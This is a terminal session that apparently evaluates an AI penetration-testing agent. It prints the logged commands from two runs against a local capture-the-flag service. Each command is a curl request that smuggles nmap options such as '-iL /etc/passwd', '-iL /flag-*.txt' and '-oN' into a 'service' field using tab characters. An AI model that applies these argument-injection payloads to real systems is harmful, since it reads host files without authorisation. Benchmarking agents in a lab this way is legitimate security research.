```
(venv) shrikant@taic:~/faem-pentest-agent$ python3 evaluation/log_reader.py --commands logs/challenge/no_memory/20260629_124517.jsonl
curl -X POST http://localhost:1337/ -d "service=127.0.0.1:80%09-iL /flag-*.txt"
curl -X POST http://localhost:1337/ -d "service=127.0.0.1%09-iL /flag-*.txt:80"
curl -X POST http://localhost:1337/ -d "service=127.0.0.1:80%09-iL /etc/passwd"
curl -X POST http://localhost:1337/ -d "service=127.0.0.1:80%09-iL%09/flag-*.txt"
curl -X POST http://localhost:1337/ -d "service=127.0.0.1:80%09-V"
curl -X POST http://localhost:1337/ -d "service=127.0.0.1:%09-iL /flag-*.txt"
curl -X POST http://localhost:1337/ -d "service=127.0.0.1:1337%09-iL /etc/passwd"
curl -X POST http://localhost:1337/ -d "service=127.0.0.1:1%09-Pn%09-iL /etc/passwd"
curl -X POST http://localhost:1337/ -d "service=127.0.0.1:1337"
curl -X POST http://localhost:1337/ -d "service=127.0.0.1:1337%09-iL /etc/hostname"
curl -X POST http://localhost:1337/ -d "service=127.0.0.1:1337%09-V"
curl -X POST http://localhost:1337/ -d "service=127.0.0.1:1337%09-Pn%09-iL /etc/passwd"
curl -X POST http://localhost:1337/ -d "service=127.0.0.1:1337%09-oN /tmp/out"
curl -X POST http://localhost:1337/ -d "service=127.0.0.1:1337%09-iL /flag-*.txt"
curl -X POST http://localhost:1337/ -d "service=127.0.0.1:1337%09-iL /flag.txt"



(venv) shrikant@taic:~/faem-pentest-agent$ python3 evaluation/log_reader.py --commands logs/challenge/faem/20260630_104330.jsonl
curl -X POST http://localhost:1337/ -d "service=127.0.0.1:80"
curl -X POST http://localhost:1337/ -d "service=$(printf '127.0.0.1:80\t-iL /etc/passwd')"
curl -X POST http://localhost:1337/ -d "service=$(printf '127.0.0.1\t-iL /etc/passwd:80')"
curl -X POST http://localhost:1337/ -d "service=$(printf '127.0.0.1:80\t-iL /flag-*.txt')"
curl -X POST http://localhost:1337/ -d "service=127.0.0.1:1337"
curl -X POST http://localhost:1337/ -d "service=$(printf '127.0.0.1:1337\t-iL /flag-*.txt')"
curl -X POST http://localhost:1337/ -d "service=$(printf '127.0.0.1:1337\t-iL /etc/passwd')"
printf "service=127.0.0.1:1337\t-iL /flag-*.txt" | curl -X POST http://localhost:1337/ -d @-
curl -X POST http://localhost:1337/ -d "service=$(printf '127.0.0.1\t-iL /flag-*.txt:1337')"
curl -X POST http://localhost:1337/ -d "service=$(printf '127.0.0.1:1337\t-iL /etc/hostname')"
curl -X POST http://localhost:1337/ -d "service=$(printf '127.0.0.1:1234\t-iL /flag-*.txt')"
curl -X POST http://localhost:1337/ -d "service=$(printf '127.0.0.1:1337\t-sn')"
curl -X POST http://localhost:1337/ -d "service=$(printf '127.0.0.1:1337\t-V')"
curl -X POST http://localhost:1337/ -d "service=$(printf '127.0.0.1:1337\t--script=banner')"
curl -X POST http://localhost:1337/ -d "service=$(printf '127.0.0.1:1337\t-sn -iL /etc/hostname')"
```